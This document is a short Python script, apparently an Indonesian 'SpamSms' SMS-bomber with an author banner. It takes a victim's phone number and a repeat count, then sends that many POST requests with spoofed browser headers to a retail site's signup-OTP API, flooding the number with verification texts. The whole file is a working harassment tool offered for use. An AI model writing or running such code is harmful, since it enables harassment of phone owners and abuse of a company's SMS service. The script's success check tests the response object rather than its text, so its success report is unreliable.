import json
import requests
import os
import sys
import time
from time import sleep

def main():
	os.system('clear')
	os.system('figlet SpamSms')
	print ('[•]───────────────────────────────────────────[•]')
	print (' | [•]  Author  : MR.FAGHP BLACK-404/F	       |')
	print (' | [•]  TEAM    : MTI                          |')
	print (' | [•]  Chanel  : FAGHP 		       |')
	print ('[•]───────────────────────────────────────────[•]')
	print ('  ')
	no = input('×> ')
	sleep(2)
	jum = input('×> ')

	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}


	for x in range(int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
	if 'Eror' in leosureo:
		print('Gagal Spaming')
	else:
		print('Sukses spaming')

if __name__=='__main__':
       main()
